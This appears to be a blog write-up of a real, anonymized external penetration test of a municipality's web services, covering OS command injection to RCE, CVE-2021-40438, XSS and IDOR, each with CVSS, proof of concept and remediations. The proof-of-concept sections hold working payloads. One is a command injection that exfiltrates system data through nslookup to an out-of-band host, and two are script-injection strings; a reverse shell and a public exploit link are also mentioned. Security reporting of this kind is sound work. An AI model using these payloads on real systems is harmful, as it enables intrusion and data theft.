---
layout: post
title: 'Municipality External PT'
tags:
 - web
 - real-engagement
hero: https://images.unsplash.com/photo-1462206092226-f46025ffe607?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1474&q=80
overlay: blue
---

No images (image for the step by step PoC are essential as evidence but will not be provided
) or references will be provided, as this assessment was a real engagement. Additionally, all URLs and functionalities have been anonymized to ensure privacy and compliance with non-disclosure agreements (NDAs). {: .lead} <!--break-->

# Municipality

## Type of activity and objectives
The objective of this engagement was to conduct an external penetration assessment for the organization. The aim was to identify potential vulnerabilities that could potentially be exploited from outside sources, with the goal of preventing unauthorized access and compromise.
## Scope of evaluation
The evaluation was focused on the external surface of the organization. This scope encompassed assessing the security and potential vulnerabilities within this external surface.
## Executive Summary
The security assessment conducted on the target environment revealed several significant findings that require immediate attention:

1. **OS Command Injection to Remote Code Execution (RCE):**
   The team successfully exploited an OS command injection vulnerability that led to remote code execution within the application. This critical finding poses a severe risk to the security and functionality of the application, as attackers could potentially execute arbitrary code and gain unauthorized access.

2. **CVE-2021-40438:**
   During the assessment, the team identified the presence of CVE-2021-40438, a known security vulnerability. This finding indicates that the application might be susceptible to a specific type of attack, potentially allowing attackers to compromise its integrity, confidentiality, or availability.

3. **Cross Site Scripting (XSS):**
   The team discovered instances of Cross-Site Scripting (XSS) vulnerabilities within the application. These vulnerabilities can be exploited to inject malicious scripts into web pages viewed by other users, compromising their browsing experience and potentially leading to data theft or unauthorized actions.

4. **Insecure Direct Object References (IDOR):**
   The assessment identified instances of Insecure Direct Object References (IDOR) vulnerabilities within the application. These vulnerabilities can enable attackers to access sensitive resources or data that they should not have access to, potentially leading to unauthorized information disclosure or data manipulation.

Failing to address these vulnerabilities could result in unauthorized access, data breaches, and potential financial and reputational damages. It is strongly recommended that the organization takes prompt actions to remediate these vulnerabilities and enhance the overall security posture of the external surface.
## Finding Summary
- OS cmd injection to RCE
- CVE-2021-40438
- Cross Site Scripting (XSS)
- IDOR
## Attack storyline or vulnerabilities with CVSS,CVE and remedations
### OS cmd injection to RCE
- CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
#### Proof of Concept (PoC) 
The following path was founded vulnerable: /password/index.php

- Detection of OS Injection: Using the payload `values%5Bpassword%5D=test|nslookup $(uname -r).collab.com.&`, the attacker identifies the presence of OS command injection by leveraging the nslookup command to execute the uname -r command, which retrieves the kernel version of the target system.

- Achieving Remote Code Execution: With the knowledge of the OS injection vulnerability, the attacker proceeds to execute arbitrary commands to gain control over the target system. In this PoC, the attacker leverages a crafted Python shell payload to establish a reverse shell connection, allowing them to remotely interact with the compromised system.
#### Remediations
- Implement Input Validation and Sanitization: Apply strict input validation and sanitization on all user-supplied inputs, especially those that are used in executing commands or constructing queries. This includes both form fields and URL parameters. Use input validation libraries and functions that reject or sanitize any suspicious or malicious inputs.

- Use Parameterized Queries: If database queries are involved, switch to using parameterized queries or prepared statements to prevent SQL injection vulnerabilities. This also helps mitigate OS command injection if the query construction is involved.

- Whitelisting Allowed Commands: Maintain a whitelist of allowed commands and sanitize input to ensure that only authorized commands can be executed. Validate user inputs against this whitelist before using them in command execution.
### CVE-2021-40438
- CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
#### Proof of Concept (PoC) 
A crafted request uri-path can cause mod_proxy to forward the request to an origin server choosen by the remote user. This issue affects Apache HTTP Server 2.4.48 and earlier.

The following was used for exploitation: https://github.com/Kashkovsky/CVE-2021-40438 .
#### Remediations
- Update the Apache HTTP Server

### Cross Site Scripting (XSS)
- CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
#### Proof of Concept (PoC) 
The provided Proof of Concept (PoC) demonstrates Cross-Site Scripting (XSS) vulnerabilities within a web application. XSS is a type of security vulnerability that occurs when an application does not properly sanitize or validate user input before rendering it on a web page. This allows an attacker to inject malicious scripts into the application, which are then executed within the context of other users' browsers.

In the context of the PoC:

- `authRequestCode=</script><script>alert(1)</script>`
Here, the value provided for the authRequestCode parameter includes a script tag </script> to prematurely close the preceding script tag, followed by another script tag <script> that contains the JavaScript code alert(1). This payload attempts to execute an alert box with the message "1" when the vulnerable page is loaded by another user.

- `lang=asas';alert(1)//34`
In this payload, the lang parameter is set to a string asas', followed by the alert(1) JavaScript code. The //34 at the end of the payload appears to be an attempt to comment out the rest of the parameter value. This payload aims to inject an alert box in a similar manner to the previous payload.
#### Remediations
- Input Validation: Validate and sanitize all user inputs on the server-side before processing or rendering them. Use input validation libraries or frameworks to ensure that only expected and safe characters are allowed.

- Contextual Escaping: Apply context-specific escaping for user-generated content based on where it will be rendered (e.g., HTML, URL, JavaScript). Use appropriate escaping functions to ensure data is treated as data and not code.

- Output Encoding: Encode user-generated content and other dynamic data before rendering it in HTML, JavaScript, or other contexts. Use appropriate encoding functions for the specific context (e.g., HTML entities, JavaScript escaping) to prevent scripts from being executed.
### IDOR
- CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
#### Proof of Concept (PoC) 
During the test it was possbile ot view other user submiteted forms via an IDOR in the folling In this Proof of Concept (PoC), a vulnerability related to Insecure Direct Object References (IDOR) was identified within the web application. The specific parameter being tested is "?formId=15394." By manipulating this parameter and supplying different values, the attacker was able to access and view forms submitted by other users, potentially compromising their sensitive data.

An Insecure Direct Object Reference occurs when an application exposes a reference to an internal implementation object, such as a file, directory, or database record, without proper authorization checks. In this case, the application failed to validate the user's authorization before providing access to form submissions associated with a specific form ID.
#### Remediations
- Implement Proper Authorization Checks: Ensure that access controls and authorization checks are implemented for all resources and functionalities. Verify that users have the necessary permissions to access specific objects or data before providing them with access.

- Use Indirect Object References: Avoid directly exposing internal object references such as database IDs or filenames to users. Instead, use indirect references or tokens that are validated and mapped to the corresponding objects on the server side.

- Implement Contextual Access Control: Apply access controls based on the context of the user, their role, and the data they are allowed to access. This includes ensuring that users can only access their own data or data they are authorized to view.
